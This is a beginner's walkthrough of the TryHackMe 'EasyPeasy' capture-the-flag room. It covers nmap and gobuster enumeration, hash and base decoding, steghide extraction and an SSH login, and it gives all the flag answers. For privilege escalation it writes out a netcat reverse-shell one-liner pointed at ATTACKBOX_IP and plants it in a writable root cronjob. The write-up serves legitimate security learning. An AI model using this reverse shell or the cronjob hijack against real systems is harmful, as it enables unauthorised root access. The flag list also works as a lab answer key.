# [EasyPeasy Room](https://tryhackme.com/room/easypeasyctf)
![EasyPeasy Room Image](/resources/easypeasy/EasyPeasy.png)
## Introduction
The EasyPeasy Room is an "easy" rated CTF room on TryHack that aims to give beginners in Cybersecurity a way to apply the tools that they've learned i.e. nmap, Gobuster. in a more practical scenario. In this document, I will explain the steps I take as I go through this room. I have started this room on July 2nd of 2023 and I will continue to detail my steps as I go further through the room.

## Write-Up
This section details the steps I've taken to complete this CTF.

### Task 1: Enumeration through Nmap
#### Step 1: Nmap Scan
To start off, I decided to go with an nmap scan to enumerate the deployed machine. I ran this command on the AttackBox:   
`nmap -vv -T5 -A -p- MACHINE_IP`  
The results of the scan are below.  
![EasyPeasy Nmap Scan Results](/resources/easypeasy/EasyPeasyNmapScan.png)
#### Nmap Command Breakdown
If you're not interested in my breakdown of what the flags/switches/options on the nmap command do, you can skip by clicking [here](https://github.com/RawBoeuf/thm-ctf-writeups/edit/main/EasyPeasy.md#results-analysisanswering-the-task-questions).

First on the board is the `-vv` switch. (I will be using "switch" from now on to not confuse it with the CTF's flags/objectives.)  
This switch enables verbosity level 2. Another similar switch is `-v` this switch increases the verbosity by one level. Verbosity level 2 just means that nmap will provide you with more output. It's especially nice when you can see nmap report the ports as it discovers them although if you want more detailed information such as OS detection, you have to wait for the scan to finish. I just use this in every nmap scan because it's a good habit to have. It is also what is recommended in TryHackMe's introduction room to nmap.  

Next, we have the `-T5` switch. This switch determines the timing of the nmap scan or how fast the connection is. Currently, we are targeting a very insecure machine so there's no need to worry about IPS or IDS so I just went with T5 for the fastest results. But, in general, the [manual page](https://linux.die.net/man/1/nmap) of nmap recommends you use -T4 on your nmap scans as T5 is a very aggressive setting.

Moving to the `-A` switch. This switch enables aggressive scan options. According to the nmap man page, this option enables OS detection `-O`, version scanning `-sV`, script scanning `-sC`, and traceroute `--traceroute`. For the purposes of Task 1, we only really need the `-sV` switch, but the `-A` switch provides some extra information that we will be using in Task 2.

Lastly, we have the `-p-` switch. This switch determines which ports nmap will scan on the target machine. The original switch is `-p` where you can pass parameters to instruct nmap on which ports to scan. For a more detailed breakdown of it, you can have a look at the manual page. My addition of a dash to the switch just means that nmap will scan through the full port range, so ports 1-65535.

Now that we have an understanding of what the nmap scan is doing, we can move onto analyzing the results and answering the questions.

#### Results Analysis/Answering The Task Questions
**Question 1: How many ports are open?**  

If we take a look at the nmap scan results [above](https://github.com/RawBoeuf/thm-ctf-writeups/edit/main/EasyPeasy.md#step-1-nmap-scan).   
We can find that ports 80, 6498, and 65524 are open. Thus, the answer to this question is 3.  
**Answer: 3**   

**Question 2: What is the version of nginx?**  
For your convenience, I have put the relevant section of the nmap scan below.  
 ![EasyPeasy Nmap Scan Results Apache](/resources/easypeasy/EasyPeasyNmapNginx.png)  
We can see that port 80 is open on the target and that it is hosting nginx version 1.16.1. Therefore, the version of nginx is 1.16.1.  
**Answer: 1.16.1**

**Question 3: What is running on the highest port?**  
The highest port discovered from the nmap scan is 65524, so let's take a look at what nmap found.  
![EasyPeasy Nmap Scan Results Apache](/resources/easypeasy/EasyPeasyNmapApache.png)  
Looks like nmap found port 65524 to be hosting an apache http server instance. Therefore, we have our answer.  
**Answer: apache**   

### Task 2: Compromising the machine  
**Note:** I'm showing you my own thought process so the order that I discovered the flags is not in the order of the tasks. I will still mention which flags correspond to which answer. Thanks for reading!
#### Step 1: Cursory Investigation
Before we do anything else, we can do some basic info-gathering. We see that the machine has two http services open on ports 80 and 65524. The nmap scan even notes that both ports have a robots.txt file.

First, let's take a look at the robots.txt file on both ports.  

![Robots.txt Nginx](/resources/easypeasy/EasyPeasyNginxRobotsTxt.png)  

![Robots.txt Apache](/resources/easypeasy/EasyPeasyApacheRobotsTxt.png)  

It looks like port 65524 has something interesting for the User-Agent field. I decided it looks like a hash. So, let's throw it into [CyberChef](https://cyberchef.org/).   

![CyberChef Image](/resources/easypeasy/CyberChef.png)  

I put it into CyberChef's analyze hash function. Looks like we have a lead.  

![CyberChef Flag 2 Analyzer](/resources/easypeasy/EasyPeasyFlag2CyberChef.png)  

So, I ran it through a few MD5 decoders, and md5hashing.net scored a result.  

![Second Flag from md5hashing.net](/resources/easypeasy/Task2SecondFlagDecode.png)   

There's our second flag!  

**Question 2: Further enumerate the machine, what is flag 2?**  
**Answer: flag{1m_s3c0nd_fl4g}**  

Let's have a look at the homepage and its HTML for any hidden information.  

![Nginx Enumeration](/resources/easypeasy/EasyPeasyNginxHomepage.png)  

This looks like a default thank you page for someone who's just got Nginx running. Maybe the creator of the machine has hidden something in the HTML code?  

![Nginx HTML Enumeration](/resources/easypeasy/EasyPeasyNginxHomepageHTML.png)   

Looks like we're not getting anything here. I'll take a look at the Apache instance on port 65524. To get there we just need to state the port in the browser's search tab: ``http://MACHINE_IP:65524/``  
Let's take a look at the homepage.  

![Apache Enumeration](/resources/easypeasy/EasyPeasyApacheHomepage.png)  

Nothing at the beginning there, let's scroll down a bit.    

![Flag 3](/resources/easypeasy/EasyPeasyFlag3.png)   

Oh, that's odd. Looks like someone just left flag 3 in the open. Well, I guess we have our answer to Question 3.  

**Question 3: Crack the hash with easypeasy.txt, What is the flag 3?**  
**Answer: flag{9fdafbd64c47471a8f54cd3fc64cd312}**  

There's nothing else of interest at first glance, so let's take a look at the HTML for the page.  

![Apache HTML Enumeration](/resources/easypeasy/EasyPeasyApacheHomepageHTML.png)  

That's a lot of HTML! Let's give it a quick skim and look for anything that looks out of place.  

![Apache Hidden Paragraph](/resources/easypeasy/HiddenParagraph.png)

There seems to be a hidden paragraph that contains an encoded flag. The paragraph says it's encoded in a base. I'll be using CyberChef again, but this time I'll be using its base decoding function. 

After a few tries, we get a comprehensible output from Base62. This looks to be our fourth flag.

![CyberChef Decoded](/resources/easypeasy/EasyPeasyFourthFlag.png)  

**Question 4: What is the hidden directory?**  
**Answer: /n0th1ng3ls3m4tt3r**  

#### Step 2: Directory Enumeration  
Now that we can't find anything through a cursory glance, let's try to find some hidden directories. For this, we'll need a tool like Gobuster. Dirbuster is another tool that you can also use, but Gobuster is what we'll be using in this walkthrough.  

The command I'll be running is `gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`.  

`dir` sets gobuster into directory enumeration mode. `-u` sets the url that we will be enumerating. Finally, `-w` sets the wordlist that we will be using for directory enumeration. In this case, I'll be using a preset wordlist that comes with the AttackBox "directory-list-2.3-medium.txt". For more detailed information, visit the gobuster [man page](https://www.kali.org/tools/gobuster/).  

Let's take a look at the results of gobuster below.  

![Gobuster Results](/resources/easypeasy/GobusterNginxResults1.png)  

That's great, we found something! Let's go to it on the web browser to see what it shows.  

![Hidden Page](/resources/easypeasy/EasyPeasyHidden.png)   

At first glance, there doesn't really seem to be anything going on. So, we'll have a look at the HTML source code.

![Hidden HTML](/resources/easypeasy/EasyPeasyHiddenHTML.png)

Hm. It looks like there's nothing here either. Let's have another go at this with gobuster. The command I'll be running is `gobuster dir -u http://MACHINE_IP/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`  

![Gobuster Results 2](/resources/easypeasy/GobusterNginxResults2.png)  

Let's have a look at this directory that we've found. 

![Whatever Directory](/resources/easypeasy/EasyPeasyWhatever.png)  

The page doesn't seem to have anything useful, so let's have a look at the HTML.  

![Whatever HTML](/resources/easypeasy/EasyPeasyWhateverHTML.png)  

Oh? Another hidden paragraph? That's interesting. Whatever the contents are seem to be obfuscated. I'll check with CyberChef to see what it is. After a few tries, I found that it was encoded in Base64.

![First Flag Decoded](/resources/easypeasy/FirstFlag.png)

Well, there's our first flag!  

**Question 1: Using GoBuster, find flag 1.**  
**Answer: flag{f1rs7_fl4g}**  

This directory seems to be a dead end. So, let's go check out that hidden directory we found before for Question 4.  

Accessing the directory gives us this page below:  
![n0th1ng3ls3m4tt3r](/resources/easypeasy/n0th1ng3ls3m4tt3r.png)  

Nothing at first glance, so let's have a look at the HTML.  

![n0th1ng3ls3m4tt3r HTML](/resources/easypeasy/n0th1ng3ls3m4tt3rHTML.png)  

The paragraph element seems to have something. It looks like a hash, so I'll put it into CyberChef's hash checker.   

![n0th1ng3ls3m4tt3r CyberChef](/resources/easypeasy/n0th1ng3ls3m4tt3rCyberChef.png)  

After some trial and error, I was able to determine that the hash was a GOST hash. Here are the results from md5hashing.net's GOSH decoder.  

![md5hashing GOST](/resources/easypeasy/GOST.png)  

**Question 5: Using the wordlist that provided to you in this task crack the hash
what is the password?**
**Answer: mypasswordforthatjob**

#### Step 3: Steganography

Some gobuster enumeration revealed no results, so I determined there was probably something fishy to do with the image. So I downloaded it onto my attackbox and ran steghide extraction on it. `steghide extract -sf index.png`  
`extract` specifies that we want to extract hidden information from the file. `-sf` specifies the file that we want to extract the information from. More information can be found on the steghide [man page](https://steghide.sourceforge.net/documentation/manpage.php).  

It requires a passphrase, well we still haven't used the password from the previous question so let's try it.

![StegHide](/resources/easypeasy/StegHideWorks.png)  

Let's have a look at what steghide has to offer.  

![StegHide Results](/resources/easypeasy/SteghideResults.png)  

These results look promising. It looks like the password is in binary, let's deobfuscate that real quick.  

![Binary Conversion](/resources/easypeasy/binaryconversion.png)  

#### Step 4: SSH

**Question 6: What is the password to login to the machine via SSH?**  
**Answer: iconvertedmypasswordtobinary**  

As the question implies, let's log in to the machine using SSH. I'll be running this command: `ssh boring@MACHINE_IP -p 6498`  

Saying yes to the prompt and entering the password we got from the previous question, I find myself on the machine. First thing is to find the flag for this question.  

![Login Success](/resources/easypeasy/boringlogin.png)  

Let's run `ls` also known as "list" to see what's in the user's home directory.  

![LS](/resources/easypeasy/lsresults.png)  

Cool! A text document. To view its contents, I'll run `cat user.txt`.  

![user.txt](/resources/easypeasy/usertxtresults.png)  

These results look... weird. Following the flag convention that we've seen before the first four letters should be flag. It's most likely a Caesar Cipher. So let's run this through a [decoder](https://www.dcode.fr/caesar-cipher) and see what we get.

![usertxt Decoded](/resources/easypeasy/usertxtdecoded.png)  

**Question 7: What is the user flag?**  
**Answer: flag{n0wits33msn0rm4l}**  

#### Step 5: Cronjob

At this point, I was a bit stuck. The question implies that we need root access but I wasn't sure what to do. The description of the room mentioned cronjobs, but I had no clue how to exploit it so I took a look at [this writeup](https://github.com/iLinxz/CTF-Walkthroughs/blob/TryHackMe/TryHackMe%23EasyPeasy.pdf) by iLinxz. You can take a look at their write-up or see my explanation below for the process.  

There's a vulnerability to do with cronjobs so I'm going to explore the `/etc` directory using this command: `ls /etc/ | grep -i "cron"`  
This command will sort through the /etc/ directories and files and find all results that have the word "cron" in them. Here are the results below:  

![/etc/ search](/resources/easypeasy/etcsearch.png)  

anacrontab and crontab are files while the others are directories. I used cat on both and found that crontab had something interesting.  

![crontab](/resources/easypeasy/crontab.png)  

It looks like there's a bash file in `/var/www/` that gets run periodically specifically every minute. This looks like the cronjob vulnerability that we were looking for. I run nano on it using `nano /var/www/.mysecretcronjob.sh` since vim isn't installed on the machine and find that it is indeed writable. Eureka.  

Now for some exploiting. We'll be setting up a Reverse Shell using netcat. To do that, we'll need to add this line `rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKBOX_IP 4444 >/tmp/f` to the `.mysecretcronjob.sh` file. Along with running the command `netcat -lvnp 4444` on our own machine, we'll have our reverse shell up and running the next time this cronjob is run. For more detailed breakdown of the commands click [here]().  

After a bit of waiting, this is what I received on my netcat listener. I ran whoami to make sure it was working properly.  

![Reverse Shell Success](/resources/easypeasy/netcatlisten.png)  

Looks like we have root access! Now, let's go to the root home directory and find that flag. To do that we run `cd ~` and to check the directory we can run `ls`.  

![Root Directory Fail](/resources/easypeasy/hiddenroot.png)  

Hm. It seems like `ls` is not picking up anything. It might be a hidden file. Let's run `ls -al`. `-a` makes it so we can see hidden files and `-l` sets it to a long listing format.  

![There it is!](/resources/easypeasy/rootexposed.png)    

There we go. It should be in .root.txt so let's run `cat .root.txt` real quick and we should have this task over with.  

![Flag 8](/resources/easypeasy/flag8.png)

**Question 8:**  
**Answer: flag{63a9f0ea7bb98050796b649e85481845}**  

####Cronjob Detailed Breakdown

